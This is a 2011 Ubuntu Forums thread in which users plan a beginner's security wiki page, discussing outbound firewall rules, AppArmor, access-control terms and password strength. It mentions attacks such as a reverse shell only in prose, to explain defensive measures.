Another informative but short one: [http://www.wright.edu/rsp/Security/V1comput/Social.htm](http://www.wright.edu/rsp/Security/V1comput/Social.htm)

---

### Post by haqking on 2011-11-05
> **Ms. Daisy said:**
> ROFL!  88 mph, come on!!  And I'm sad I missed that ebay auction for the FluxBox capacitor.

[http://www.sans.org/reading_room/whitepapers/engineering/social-engineering-means-violate-computer-system_529](http://www.sans.org/reading_room/whitepapers/engineering/social-engineering-means-violate-computer-system_529)

Dense but informative.

Aso informative is a thread i started a while back which links to the CEH video course by Shon Harris which if nothing else shows you what can be done which is always educational.

[http://ubuntuforums.org/showthread.php?t=1789418](http://ubuntuforums.org/showthread.php?t=1789418)

25 hours of free training

---

### Post by Ms. Daisy on 2011-11-05
> **haqking said:**
> Aso informative is a thread i started a while back which links to the CEH video course by Shon Harris which if nothing else shows you what can be done which is always educational.

[http://ubuntuforums.org/showthread.php?t=1789418](http://ubuntuforums.org/showthread.php?t=1789418)

25 hours of free trainingOMG that's awesome.

---

### Post by OpSecShellshock on 2011-11-05
> **haqking said:**
> Aso informative is a thread i started a while back which links to the CEH video course by Shon Harris which if nothing else shows you what can be done which is always educational.

[http://ubuntuforums.org/showthread.php?t=1789418](http://ubuntuforums.org/showthread.php?t=1789418)

25 hours of free training

Oh yeah, she wrote my kitten-killer prep guide/thing I stand on to reach high stuff.

---

### Post by haqking on 2011-11-05
> **OpSecShellshock said:**
> Oh yeah, she wrote my kitten-killer prep guide/thing I stand on to reach high stuff.

The vids are actually a guy, i cant stand watching her personally she is way too monotone

---

### Post by Dangertux on 2011-11-05
Her eyes are freaky... I could stare into them for hours lol.

As promised here is my contribution for the next rest of ever (I kid..) [http://ubuntuforums.org/showthread.php?p=11428970](http://ubuntuforums.org/showthread.php?p=11428970)

---

### Post by SparTacux on 2011-11-05
Question about Restrictive Outgoing Policies

 I use a restrictive outgoing policy on my modem firewall so that nothing goes out onto the internet that I don't want going out.  Do I also need to apply restrictive outgoing policies on all computers on my home network as well? All computers on the network have deny all incoming traffic set with one or two open ports for services I require.

I know a compromised computer on your network ( such as a windows machine ;-) ) can attack your network from within the network itself but a deny incoming traffic would block probes from within. So what's the purposes of a restrictive outgoing policy on all machines?

---

### Post by Dangertux on 2011-11-05
> **SparTacux said:**
> Question about Restrictive Outgoing Policies

 I use a restrictive outgoing policy on my modem firewall so that nothing goes out onto the internet that I don't want going out.  Do I also need to apply restrictive outgoing policies on all computers on my home network as well? All computers on the network have deny all incoming traffic set with one or two open ports for services I require.

I know a compromised computer on your network ( such as a windows machine ;-) ) can attack your network from within the network itself but a deny incoming traffic would block probes from within. So what's the purposes of a restrictive outgoing policy on all machines?

Nothing is foolproof. 

For instance, your router OBVIOUSLY allows outbound requests to port 53 and 80, and probably 443 as well as a few others.

That being said, let's say you download a video you want to watch and it's actually a malicious file designed by an attacker to reverse connect to their machine on port 80, and download the rest of its shellcode. It's going to execute by using the recent VLC heap based corruption overflow.  So when you open this video, bam there is your reverse shell, and you just got owned.

That being said, what is the likelihood that you had port 80 blocked outbound on a workstation? Not high right? 


So I guess it's up to you to decide if its worth it or not. I'm just discussing it because one , not everyone has a router with strong outbound policies. And 2 , not everyone is the victim of a targeted attack like the one I described above.

---

### Post by SparTacux on 2011-11-05
> **Dangertux said:**
> Nothing is foolproof. 

For instance, your router OBVIOUSLY allows outbound requests to port 53 and 80, and probably 443 as well as a few others.

That being said, let's say you download a video you want to watch and it's actually a malicious file designed by an attacker to reverse connect to their machine on port 80, and download the rest of its shellcode. It's going to execute by using the recent VLC heap based corruption overflow.  So when you open this video, bam there is your reverse shell, and you just got owned.

That being said, what is the likelihood that you had port 80 blocked outbound on a workstation? Not high right? 


So I guess it's up to you to decide if its worth it or not. I'm just discussing it because one , not everyone has a router with strong outbound policies. And 2 , not everyone is the victim of a targeted attack like the one I described above.

I'm just trying to decide if I need to apply a restrictive outgoing policy on each computer as well as the modem. If there is a logical reason for it then it makes sense to do so. I was looking at the possibility of a compromise within the network itself targeting my open ports on my computers. 

I know some guys don't have a firewall ( with restrictive policies ) on the modem and maybe use their computers on wifi networks or use dongles  - in such cases the restrictive outgoing policy is a definite plus. If a firewall is at the perimeter ( on a modem ) then maybe the case isn't so clear cut.

---

### Post by Dangertux on 2011-11-05
Firewalls aren't everything just one piece to the puzzle. 

Let me ask you this. Are your applications confined using MAC? You might get more bang for your buck if you did that instead.

---

### Post by Bukie on 2011-11-06
Hello all, I have read the previous 21 pages and would like to offer some suggestions. (I'm a newbie to firewalls and know little about them but have been using Linux for over 2 years now)  

1) I applaud your desire to educate people about security but these &quot;newbies&quot; aren't people who are new to computers. The greater majority of those switching to Ubuntu were prior Windows users and while this is certainly the place to discuss matter such as proper use of root, using caution when running codes from forums, and encryption, teaching people how to construct passwords is not necessary. No more than a couple paragraphs should be devoted to general security. This is UBUNTU forums, after all. The Wiki page should mainly focus on Ubuntu.  

2) Continuing on with the &quot;This is UBUNTU forums, after all,&quot; I believe it is imperative to realize that the reason most people switched to Linux in the first place is because they have become tired of using OS's which more-and-more replace user-controlled programs with automatic, behind-the-scenes programs. As such, these people (myself included) are seeking to learn about the command line and specifically, how to setup/maintain a firewall such as ufw through that command line. If you want to make a great Wiki page, DO go into detail when it comes to ufw, ssh, etc. Start out easy and build, like in a class. Explain what ports and LAN/WAN are. Explain the basics of how internet communication works and how Ubuntu can help protect users.   

3) A quick note on passwords. While it is good to use at least one capital, one number, one character, it infuriates me to no end when I see people suggest users use passwords such as &quot;R#d5fg3ZdF&quot; An easier-to-remember AND SAFER password would be something like &quot;ThisIsMyP@55word&quot; It has more characters and would take longer to decipher using a brute force attack. APG is more trouble than it's worth.   

Finally, please don't take me to be an arrogant jerk who posts once and never comes back. I would like to help further the work you are all doing but I must say once more that I do believe the Wiki page SHOULD feature the nitty-gritty code, along with a through explanation of what is being done. You are all very knowledgeable and it is true that firewalls have a steep learning curve but please do help people such as myself to master that curve instead of simply saying that firewall/security get really complicated, really quickly. Us noobs know that, that's why we're here.  

Thanks for hearing me out, Bukie

---

### Post by vasa1 on 2011-11-06
Bukie,

You'll find a lot of stuff here:
[https://help.ubuntu.com/community](https://help.ubuntu.com/community)

---

### Post by vasa1 on 2011-11-06
> **Dangertux said:**
> Firewalls aren't everything just one piece to the puzzle. 

Let me ask you this. Are your applications confined using MAC? You might get more bang for your buck if you did that instead.

By MAC, are you implying something like AppArmor?

If so, I'd love for a simple step-by-step guide for dummies on securing just Firefox. I think if I have just one working example it would really help.

(I'm working my way through stuff like [http://www.linuxtopia.org/online_books/opensuse_guides/apparmor_guide/index.html](http://www.linuxtopia.org/online_books/opensuse_guides/apparmor_guide/index.html) and [http://ubuntuforums.org/showthread.php?t=1008906](http://ubuntuforums.org/showthread.php?t=1008906) but I honestly feel quite overwhelmed)

---

### Post by SparTacux on 2011-11-06
> **vasa1 said:**
> By MAC, are you implying something like AppArmor?

If so, I'd love for a simple step-by-step guide for dummies on securing just Firefox. I think if I have just one working example it would really help.

(I'm working my way through stuff like [http://www.linuxtopia.org/online_books/opensuse_guides/apparmor_guide/index.html](http://www.linuxtopia.org/online_books/opensuse_guides/apparmor_guide/index.html) and [http://ubuntuforums.org/showthread.php?t=1008906](http://ubuntuforums.org/showthread.php?t=1008906) but I honestly feel quite overwhelmed)

Is APPARMOR setup and confguration a subject for newbies? I don't think so. 
It's one of those subjects that I found even myself saying "I'll do that another day" ..."when I have more time to take a look at it" Maybe it needs a GUI front end to make it easier for newbies.

Maybe it is a good idea to do a sticky for a survey and ask the question " How many people have configured Apparmor to protect your internet based programs" 

1...YES
2...NO
3...I didn't know you had to configure Apparmor 
4..What's Apparmor?  ;-)

You might get some interesting replies and more hard core facts about how many people use it/don't use it.
  

Things like NOSCRIPT were pretty easy to implement as is the GUFW ( UFW ) Firewall.
Finding out about the poor default perimssions on home directories was a little hard to find but very easy to correct. Using a separate internet account for browsing is also easy to implement. Encrypting the home folder of your personal account is also easy proving someone points out that you need to do it .

If you've been using Ubuntu and Linux for years then one forgets how much learning you have done and what you think is easy now took quite some time to learn. I would concentrate on what you can do to start you on the path of good security and leave the more complicated stuff but mention you will need to learn it eventually.

---

### Post by SparTacux on 2011-11-06
> **Dangertux said:**
> Firewalls aren't everything just one piece to the puzzle. 

Let me ask you this. Are your applications confined using MAC? You might get more bang for your buck if you did that instead.

That's changing subject ;-)

I was just concentrating on restrictive outgoing policies as one piece of the jigsaw that needs putting in place.

Let me ask you a question.

If you have a modem router ( with a restrictive outgoing firewall set ) would YOU also put restrictive outgoing policies on all the machines on the network as well? If you answer YES then that's good enough for me :-)

EXTRA NOTE

My firewall restrictions came in good use yesterday as I mistyped a nmap command to scan port 631 on one of my computers. 
I typed "nmap -PN p-631 192.168.0.110"
The mistake was p-631 which should have been -p631. This caused nmap to do a DNS lookup which failed and gave my ISP's server for handling unresolved domain names as the target. nmap then did a PORT SCAN on that server. YIKES !!!!! Fortunately, my Firewall blocked most of the connections due to the restrictive policies in place. The one's that did get through to the ISP server were the ports I allowed out such as HTTP 80, HTTPS 443, etc.

So yeah - I'm all for outgoing restrictions  and can see their need.

---

### Post by haqking on 2011-11-06
> **Bukie said:**
> Hello all, I have read the previous 21 pages and would like to offer some suggestions. (I'm a newbie to firewalls and know little about them but have been using Linux for over 2 years now)  

1) I applaud your desire to educate people about security but these &quot;newbies&quot; aren't people who are new to computers. The greater majority of those switching to Ubuntu were prior Windows users and while this is certainly the place to discuss matter such as proper use of root, using caution when running codes from forums, and encryption, teaching people how to construct passwords is not necessary. No more than a couple paragraphs should be devoted to general security. This is UBUNTU forums, after all. The Wiki page should mainly focus on Ubuntu.  

2) Continuing on with the &quot;This is UBUNTU forums, after all,&quot; I believe it is imperative to realize that the reason most people switched to Linux in the first place is because they have become tired of using OS's which more-and-more replace user-controlled programs with automatic, behind-the-scenes programs. As such, these people (myself included) are seeking to learn about the command line and specifically, how to setup/maintain a firewall such as ufw through that command line. If you want to make a great Wiki page, DO go into detail when it comes to ufw, ssh, etc. Start out easy and build, like in a class. Explain what ports and LAN/WAN are. Explain the basics of how internet communication works and how Ubuntu can help protect users.   

3) A quick note on passwords. While it is good to use at least one capital, one number, one character, it infuriates me to no end when I see people suggest users use passwords such as &quot;R#d5fg3ZdF&quot; An easier-to-remember AND SAFER password would be something like &quot;ThisIsMyP@55word&quot; It has more characters and would take longer to decipher using a brute force attack. APG is more trouble than it's worth.   

Finally, please don't take me to be an arrogant jerk who posts once and never comes back. I would like to help further the work you are all doing but I must say once more that I do believe the Wiki page SHOULD feature the nitty-gritty code, along with a through explanation of what is being done. You are all very knowledgeable and it is true that firewalls have a steep learning curve but please do help people such as myself to master that curve instead of simply saying that firewall/security get really complicated, really quickly. Us noobs know that, that's why we're here.  

Thanks for hearing me out, Bukie

All the nitty gritty complicated stuff is covered in lots of places, stickies etc.  The whole point of this WIKI we refer to in here is for noobs who dont want that.

Which as i have said a few times here it is unlikely as it gets complicated very quickly, but the stuff you want is already covered.  The aim of this wiki created by Ms Daisy and Mr leek and the rest is to be noob friendly and abstract from the complex.

If you wanted it to cover everything and be complex it would be never ending and need an internet all of its own ;-)

Peace

---

### Post by MrLeek on 2011-11-06
Done another hatchet (oops - I mean editing job!) on the wiki page. There's some more organising/re-writing to be done toward the bottom of the page. But the flow of information is more clearer now I believe.

For info, if you want to see what got cut compare the last 2 versions (the earlier version has the "edited material" section at the bottom"). Lots of that material did get used, I just editing it down to get to the point quicker.

---

### Post by vasa1 on 2011-11-06
> **SparTacux said:**
> Is APPARMOR setup and confguration a subject for newbies? I don't think so. 
It's one of those subjects that I found even myself saying "I'll do that another day" ..."when I have more time to take a look at it" Maybe it needs a GUI front end to make it easier for newbies.

Maybe it is a good idea to do a sticky for a survey and ask the question " How many people have configured Apparmor to protect your internet based programs" 

1...YES
2...NO
3...I didn't know you had to configure Apparmor 
4..What's Apparmor?  ;-)

You might get some interesting replies and more hard core facts about how many people use it/don't use it.
...

Sort of backs up my feelings on poking around a bit :)

A poll (elsewhere) would be nice.

---

### Post by haqking on 2011-11-06
> **SparTacux said:**
> Is APPARMOR setup and confguration a subject for newbies? I don't think so. 
It's one of those subjects that I found even myself saying "I'll do that another day" ..."when I have more time to take a look at it" **Maybe it needs a GUI front end to make it easier for newbies.**



Apparmor does have a GUI on some distros, in Ubuntu there is not one.

---

### Post by Ms. Daisy on 2011-11-06
> **Bukie said:**
> 1) I applaud your desire to educate people about security but these &quot;newbies&quot; aren't people who are new to computers. The greater majority of those switching to Ubuntu were prior Windows users and while this is certainly the place to discuss matter such as proper use of root, using caution when running codes from forums, and encryption, teaching people how to construct passwords is not necessary. No more than a couple paragraphs should be devoted to general security. This is UBUNTU forums, after all. The Wiki page should mainly focus on Ubuntu.  

2) Continuing on with the &quot;This is UBUNTU forums, after all,&quot; I believe it is imperative to realize that the reason most people switched to Linux in the first place is because they have become tired of using OS's which more-and-more replace user-controlled programs with automatic, behind-the-scenes programs. As such, these people (myself included) are seeking to learn about the command line and specifically, how to setup/maintain a firewall such as ufw through that command line. If you want to make a great Wiki page, DO go into detail when it comes to ufw, ssh, etc. Start out easy and build, like in a class. Explain what ports and LAN/WAN are. Explain the basics of how internet communication works and how Ubuntu can help protect users.   

3) A quick note on passwords. While it is good to use at least one capital, one number, one character, it infuriates me to no end when I see people suggest users use passwords such as &quot;R#d5fg3ZdF&quot; An easier-to-remember AND SAFER password would be something like &quot;ThisIsMyP@55word&quot; It has more characters and would take longer to decipher using a brute force attack. APG is more trouble than it's worth.   

Finally, please don't take me to be an arrogant jerk who posts once and never comes back. I would like to help further the work you are all doing but I must say once more that I do believe the Wiki page SHOULD feature the nitty-gritty code, along with a through explanation of what is being done. You are all very knowledgeable and it is true that firewalls have a steep learning curve but please do help people such as myself to master that curve instead of simply saying that firewall/security get really complicated, really quickly. Us noobs know that, that's why we're here.  Hi Bukie,
1. Focus on Ubuntu- that's a main goal of the wiki.  This thread went way off the rails about 19 pages ago and includes a discussion on flux capacitors.  But if you see something non-specific to Ubuntu in the Wiki please mention it.
2. Another goal of the Wiki is to secure Ubuntu while you learn the command line.  Then once you've got  bash down you can go back & follow a lot of the existing wikis & stickys for command line tutorials.
3. The password discussion is actually not Ubuntu-specific & we'll probably have a link to those kind of dicussions.  Maybe we'll have a link to this, too... [http://xkcd.com/936/](http://xkcd.com/936/) 

And that would be great if you want to help out!


@ SparTacux,  I would be interested to see the results of that survey.

---

### Post by haqking on 2011-11-06
> **Ms. Daisy said:**
> Hi Bukie,
1. Focus on Ubuntu- that's a main goal of the wiki.  This thread went way off the rails about 19 pages ago and includes a discussion on flux capacitors.  But if you see something non-specific to Ubuntu in the Wiki please mention it.
2. Another goal of the Wiki is to secure Ubuntu while you learn the command line.  Then once you've got  bash down you can go back & follow a lot of the existing wikis & stickys for command line tutorials.
3. The password discussion is actually not Ubuntu-specific & we'll probably have a link to those kind of dicussions.  Maybe we'll have a link to this, too... [http://xkcd.com/936/](http://xkcd.com/936/) 

And that would be great if you want to help out!


@ SparTacux,  I would be interested to see the results of that survey.

Just remember that nothing much security related is UBUNTU specific, all the principles and commands are OS agnostic.

IPTables (UFW, GUFW) work the same on all Distros

Passwords, social engineering are all the same

MAC,DAC are the same (APParmor is not an Ubuntu thing though there is no GUI for it on UBuntu as there is on some other Distros)

Just to be clear about the Ubuntu Specific thing

---

### Post by OpSecShellshock on 2011-11-06
> **haqking said:**
> Just remember that nothing much security related is UBUNTU specific, all the principles and commands are OS agnostic.

IPTables (UFW, GUFW) work the same on all Distros

Passwords, social engineering are all the same

MAC,DAC are the same (APParmor is not an Ubuntu thing though there is no GUI for it on UBuntu as there is on some other Distros)

Just to be clear about the Ubuntu Specific thing

+1

This is exactly what I was thinking. About the only major difference between Windows and Ubuntu security, especially with Win7 being the current version, is in the area of malware. Even that, from a user perspective, isn't much different (short version: there's no heuristic AV detection available for Linux).

So basically if we're talking n00b-n00b here, it's mostly this: Only use elevated privileges for tasks that require them, restrict traffic to what you need in order to do what you want to do and nothing else, only install software from the official repositories, and apply security updates to software as soon as they are available (which is also OS agnostic, but anyway).

However, for total household information security purposes, that's just not good enough. If I had only done the things I listed above I would not just fire up the old browser and head out to the bank, if you get what I'm saying.

The fundamentals of information security are kind of a big deal, and your workplace's "awareness" program is probably insufferably stupid and out of date, so to me this is as good a place as any to get into it, maybe not in the wiki itself, but certainly in the Thread of the Wiki. Ultimately though, knowing the what is not very useful without knowing the why, especially for an OS that is better suited for tweaking and tinkering.

---

### Post by Dangertux on 2011-11-06
> **Bukie said:**
> Hello all, I have read the previous 21 pages and would like to offer some suggestions. (I'm a newbie to firewalls and know little about them but have been using Linux for over 2 years now)  

1) I applaud your desire to educate people about security but these &quot;newbies&quot; aren't people who are new to computers. The greater majority of those switching to Ubuntu were prior Windows users and while this is certainly the place to discuss matter such as proper use of root, using caution when running codes from forums, and encryption, teaching people how to construct passwords is not necessary. No more than a couple paragraphs should be devoted to general security. This is UBUNTU forums, after all. The Wiki page should mainly focus on Ubuntu.  

2) Continuing on with the &quot;This is UBUNTU forums, after all,&quot; I believe it is imperative to realize that the reason most people switched to Linux in the first place is because they have become tired of using OS's which more-and-more replace user-controlled programs with automatic, behind-the-scenes programs. As such, these people (myself included) are seeking to learn about the command line and specifically, how to setup/maintain a firewall such as ufw through that command line. If you want to make a great Wiki page, DO go into detail when it comes to ufw, ssh, etc. Start out easy and build, like in a class. Explain what ports and LAN/WAN are. Explain the basics of how internet communication works and how Ubuntu can help protect users.   

3) A quick note on passwords. While it is good to use at least one capital, one number, one character, it infuriates me to no end when I see people suggest users use passwords such as &quot;R#d5fg3ZdF&quot; An easier-to-remember AND SAFER password would be something like &quot;ThisIsMyP@55word&quot; It has more characters and would take longer to decipher using a brute force attack. APG is more trouble than it's worth.   

Finally, please don't take me to be an arrogant jerk who posts once and never comes back. I would like to help further the work you are all doing but I must say once more that I do believe the Wiki page SHOULD feature the nitty-gritty code, along with a through explanation of what is being done. You are all very knowledgeable and it is true that firewalls have a steep learning curve but please do help people such as myself to master that curve instead of simply saying that firewall/security get really complicated, really quickly. Us noobs know that, that's why we're here.  

Thanks for hearing me out, Bukie

You example password 

> 
ThisIsMyP@55word
is weak. It is dictionary based, predictable and not overtly long. It would not take long to crack with rainbowcrack and a decent set of rainbow tables.

As far as the firewall and learning curve associated with that goes read here : [http://ubuntuforums.org/showthread.php?t=1876124](http://ubuntuforums.org/showthread.php?t=1876124) I provided three methods for creating a firewall including the nitty gritty code you wanted. The iptables is well commented (imo, if you need more clarification ask)

Your logic about how Ubuntu can protect users on the Internet is flawed. The approach is actually how can users protect Ubuntu and themselves from the Internet. Also you can not go from "general security" to building a custom hardened kernel, and replacing your existing one. Why? Because if you don't know what you're hardening your kernel against you're going to be lost when you start doing it. Walk before you run. 

The command line and GUI are just means to an end. Unfortunately if you don't understand what that end is, you will never get there. The goal (again IMO) is to educate users on the end, the means really aren't that steep of a learning curve. In my opinion the single largest reason for user's failure to properly secure their systems is because they don't understand the threats as they apply to them.

Security in general is a platform agnostic concept and most concepts from Windows can be migrated to Linux and vice versa. That being said most people weren't doing it right on Windows either. That's always been my point.

---

### Post by haqking on 2011-11-06
> **Dangertux said:**
> You example password 



is weak. It is dictionary based, predictable and not overtly long. It would not take long to crack with rainbowcrack and a decent set of rainbow tables.

As far as the firewall and learning curve associated with that goes read here : [http://ubuntuforums.org/showthread.php?t=1876124I](http://ubuntuforums.org/showthread.php?t=1876124I) provided three methods for creating a firewall including the nitty gritty code you wanted. The iptables is well commented (imo, if you need more clarification ask)

Your logic about how Ubuntu can protect users on the Internet is flawed. The approach is actually how can users protect Ubuntu and themselves from the Internet. Also you can not go from "general security" to building a custom hardened kernel, and replacing your existing one. Why? Because if you don't know what you're hardening your kernel against you're going to be lost when you start doing it. Walk before you run. 

The command line and GUI are just means to an end. Unfortunately if you don't understand what that end is, you will never get there. The goal (again IMO) is to educate users on the end, the means really aren't that steep of a learning curve. In my opinion the single largest reason for user's failure to properly secure their systems is because they don't understand the threats as they apply to them.

Security in general is a platform agnostic concept and most concepts from Windows can be migrated to Linux and vice versa. That being said most people weren't doing it right on Windows either. That's always been my point.

+1

Well said, ThisIsMyP@55word is an awesomely secure password....NOT !

@Bukie be careful about posting what you think is a good password, especially when it isnt, as it gives insight into the password constructs you use ;-)

edit: actually let me clarify, it is not a useless password per se, but the construction is flawed and not particulary safe as mentioned above

Peace

---

### Post by Dangertux on 2011-11-06
Also on the Apparmor questions asked. When I say MAC (Mandatory Access Controls) I do mean things like Apparmor. Unforunately it isn't the easiest thing to configure even with a GUI. It requires you know about how the application works, and for it to be even effective you need to know what the application even needs to access.

I did this a while back : [http://dangertux.wordpress.com/2011/10/09/apparmor-profiles-quickly-if-not-easily/](http://dangertux.wordpress.com/2011/10/09/apparmor-profiles-quickly-if-not-easily/)

And honestly I don't think it qualifies as noob territory, but it was as simple as I could write it. It goes through the process of creating an AA profile for chromium. Give it a shot, if you can do it, you should learn quite a bit about apparmor, if not... Well I'm not really sure what would make it easier.

Maybe asking more specific questions related to why YOU are having trouble with AA would give me a clue as to how I can explain it mroe easily.


Hope this helps.

---

### Post by SparTacux on 2011-11-06
> **Dangertux said:**
> 

Security in general is a platform agnostic concept and most concepts from Windows can be migrated to Linux and vice versa. That being said most people weren't doing it right on Windows either. That's always been my point.

+1 to that.

The nice thing about Linux is that it's not a closed black box like Windows is to most users. You are encouraged to get to grips with it and therefore the learning starts. With Windows most peoples attitude is buy a Firewall for £30 and install it's default configuration, download antivirus software , download anti malware software  and TRUST it to do the job it says on the tin. When you have a wake up call such as someone using your credit card details to buy some stuff then you become wiser.

---

### Post by vasa1 on 2011-11-06
> **Dangertux said:**
> ... When I say MAC (Mandatory Access Controls) I do mean things like Apparmor. ...
I did this a while back : [http://dangertux.wordpress.com/2011/10/09/apparmor-profiles-quickly-if-not-easily/](http://dangertux.wordpress.com/2011/10/09/apparmor-profiles-quickly-if-not-easily/)
... Maybe asking more specific questions related to why YOU are having trouble with AA...

Thanks for that! I will give your link a read. I don't have any specific questions as yet since I haven't even taken the first steps :)

---

### Post by vasa1 on 2011-11-06
> **Dangertux said:**
> ...I did this a while back : [http://dangertux.wordpress.com/2011/10/09/apparmor-profiles-quickly-if-not-easily/](http://dangertux.wordpress.com/2011/10/09/apparmor-profiles-quickly-if-not-easily/)
...

Where would you prefer feedback or questions? In a new thread over here or over at the WordPress page? (I already have a couple!)

---

### Post by Dangertux on 2011-11-06
Here is fine.

---

### Post by vasa1 on 2011-11-06
> **Dangertux said:**
> Here is fine.

I've started a new thread:
[http://ubuntuforums.org/showthread.php?p=11431499#post11431499](http://ubuntuforums.org/showthread.php?p=11431499#post11431499)

(It's past my bedtime and so there won't be more from me for a while!)

---

### Post by WasMeHere on 2011-11-06
I have put a piece of text about 'Network printer' into our Wiki page below 'Should we include the following bits?'. I suggest that you have a look at it to decide if it should be included/changed/linked-to or whatever.

In order to get this system of wiki page(s) and sticky threads fully interacting, I suggest that (in due time) those in charge of the stickies refer back to our main wiki page _*[https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)*_

Having fun trying to help :-)
Olle

---

### Post by Dangertux on 2011-11-06
Quick survey question about Apparmor, do you think video tutorials would be easier than a written tutorial?   It's been something of my personal Ubuntu quest to demystify apparmor for folks. I just have not been able to accomplish that yet.

---

### Post by Ms. Daisy on 2011-11-06
> **dangertux said:**
> security in general is a platform agnostic concept and most concepts from windows can be migrated to linux and vice versa. That being said most people weren't doing it right on windows either. That's always been my point.
+1

---

### Post by desukane on 2011-11-06
> **Dangertux said:**
> The first step to securing your environment is to realize that there is no such thing as intrinsic security.

Fascinating info. One gets a verbose quote without any information. Which really means, what you don't know will hurt you. And still, no or any info. But, if the info comes out, a
greater means of disinformation, attack or hacks occur. This can be corrected with proper use of language. Mean what you mean... (no pun)... Just a very clear setup view would be very responsible and responsive. It's the very intrinsic info that normal folks need to know.
Why am I incessantly hounded by China? Is it China? How does one, honestly, setup the firewall. It's NOT in the countless information that's provided!!! How does one setup the administrator? Pronoun and verb are mixed. Does admin need to be on or off to legitimately function, securely?
Please help, I'm really missing something... erasing the hard drive get tedious,
~TR

---

### Post by WasMeHere on 2011-11-06
If you are prepared to do it, yes I think it is worth trying. For me it is easier to read text and if applicable, look at screenshot illustrations. However for many people a video is more attractive with the interaction between speaking and showing simultaneously.

---

### Post by Ms. Daisy on 2011-11-06
> **Dangertux said:**
> Quick survey question about Apparmor, do you think video tutorials would be easier than a written tutorial?   It's been something of my personal Ubuntu quest to demystify apparmor for folks. I just have not been able to accomplish that yet.
Personally, I learn best from videos or live lectures.

 > what you don't know will hurt you desukane-  If you're trying to get your answers from this thread, then I can completely understand your frustration.  It's all over the place.  Dangertux wrote a tutorial here for the firewall: [http://ubuntuforums.org/showthread.php?t=1876124](http://ubuntuforums.org/showthread.php?t=1876124)  I found it very easy to follow.  

And the Wiki we are writing is created specifically to answer the general questions you have.  If you're getting hounded by China, then I would say that is a very specific problem and deserves it's own thread which would focus the answers directly on the problem.

---

### Post by haqking on 2011-11-06
> **desukane said:**
> Fascinating info. One gets a verbose quote without any information. Which really means, what you don't know will hurt you. And still, no or any info. But, if the info comes out, a
greater means of disinformation, attack or hacks occur. This can be corrected with proper use of language. Mean what you mean... (no pun)... Just a very clear setup view would be very responsible and responsive. It's the very intrinsic info that normal folks need to know.
Why am I incessantly hounded by China? Is it China? How does one, honestly, setup the firewall. It's NOT in the countless information that's provided!!! How does one setup the administrator? Pronoun and verb are mixed. Does admin need to be on or off to legitimately function, securely?
Please help, I'm really missing something... erasing the hard drive get tedious,
~TR

The point of this thread and the wiki is supposed to be for noobs.

if you want complex that is fine we are glad to help you with that, pose a technical question and it may get answered ?

I am not too good at explaining how you get hounded by china...that is a broad non specific question.

What is your current security /network educational level ?

Without a foundation we cant answer or educate.

The intrinic knowledge is out of the grasp of most users (noob) which is what this thread/wiki is for.

There is a plethora of educational resources on network security at your fingertips if you want to learn it here in the forum and elsewhere

---

### Post by MrLeek on 2011-11-06
> **Olle Wiklund said:**
> If you are prepared to do it, yes I think it is worth trying. For me it is easier to read text and if applicable, look at screenshot illustrations. However for many people a video is more attractive with the interaction between speaking and showing simultaneously.

I'd echo that. Short video's to highlight confusing parts should help to fill in any gaps, without wasting time with video editing.

---

### Post by Ms. Daisy on 2011-11-06
Can someone please define DAC in relation to file permissions?  I've googled it but have found nothing.  What does DAC stand for?

---

### Post by haqking on 2011-11-06
> **Ms. Daisy said:**
> Can someone please define DAC in relation to file permissions?  I've googled it but have found nothing.  What does DAC stand for?

Discretionary Access Control (comes from the orange book or TCSEC)

Who (identity) accesses what (objects) is at the discretion and under the control of the owner or administrator.

basically when you say that bob can have write access to this file you are controlling the access at your discretion.

also least privelege comes under this banner, which is give the least amount of privelege or power that is needed to perform a task.

hence not logging on as root and using sudo.

But i am not very good at explaining things ;-)

---

### Post by OpSecShellshock on 2011-11-06
> **Ms. Daisy said:**
> Can someone please define DAC in relation to file permissions?  I've googled it but have found nothing.  What does DAC stand for?

DAC stands for discretionary access control. It's probably most easily explained by user permissions and ownership.

---

### Post by Dangertux on 2011-11-06
Discretionary Access Controls : Controls based on the identification of a user or the group which they belong to. The user can pass these permissions on to another user unless confined by mandatory access controls.

---

### Post by Ms. Daisy on 2011-11-06
> **Dangertux said:**
> Discretionary Access Controls : Controls based on the identification of a user or the group which they belong to. The user can pass these permissions on to another user unless confined by mandatory access controls.Thanks guys!  I think you all three responded simultaneously.  So can we leave out DAC in the Wiki & simply talk about file permissions & link to the file permission Ubuntu.com page?  I'm leaning towards deleting the reference.  Or do you think we should define it in the Wiki?

---

### Post by haqking on 2011-11-06
> **Ms. Daisy said:**
> Thanks guys!  I think you all three responded simultaneously.  So can we leave out DAC in the Wiki & simply talk about file permissions & link to the file permission Ubuntu.com page?  I'm leaning towards deleting the reference.  Or do you think we should define it in the Wiki?

probably best to noob it up to remove the reference to DAC, leave it as file(object) permissions and least privelege,

No need to discuss DAC itself as the concepts will be covered anyways

Perhaps the other guys think it should be left though ?

---

### Post by MrLeek on 2011-11-06
I suppose it's worth mentioning Dan's Guardian - especially since it talks about using proxy servers and the like. Any security issues here? (At first glance opendns.com does it a lot easier, but since strength in depth is important having several ways to catch "dodgy" sites seems a useful thing to do).

Also for step-by-step guides like network printers - why don't we just create a page on help.ubuntu.com and link to it from the wiki page? We're trying to cram a lot of detail into one place and we end up either glossing over things or having a massive wall of text to navigate.

For example:

- highlight the risks about adding a network printer.
- Explain that it's probably safer to just connect it to a PC
- Point the user at a help page (that we might have written) that walks someone though adding a network printer safely and securely.

---

### Post by Ms. Daisy on 2011-11-06
> **MrLeek said:**
> I suppose it's worth mentioning Dan's Guardian - especially since it talks about using proxy servers and the like. Any security issues here? (At first glance opendns.com does it a lot easier, but since strength in depth is important having several ways to catch "dodgy" sites seems a useful thing to do).

Also for step-by-step guides like network printers - why don't we just create a page on help.ubuntu.com and link to it from the wiki page? We're trying to cram a lot of detail into one place and we end up either glossing over things or having a massive wall of text to navigate.

For example:

- highlight the risks about adding a network printer.
- Explain that it's probably safer to just connect it to a PC
- Point the user at a help page (that we might have written) that walks someone though adding a network printer safely and securely.
I vote no on including Dans Guardian and opendns.com.  While it may be useful (and has piqued my interest), I don't think it should be included in a basic security page for Ubuntu.

And I agree about the printer blurb.  I'd like to keep it somewhere so we can link to it.

---

### Post by OpSecShellshock on 2011-11-06
> **haqking said:**
> probably best to noob it up to remove the reference to DAC, leave it as file(object) permissions and least privelege,

No need to discuss DAC itself as the concepts will be covered anyways

Perhaps the other guys think it should be left though ?

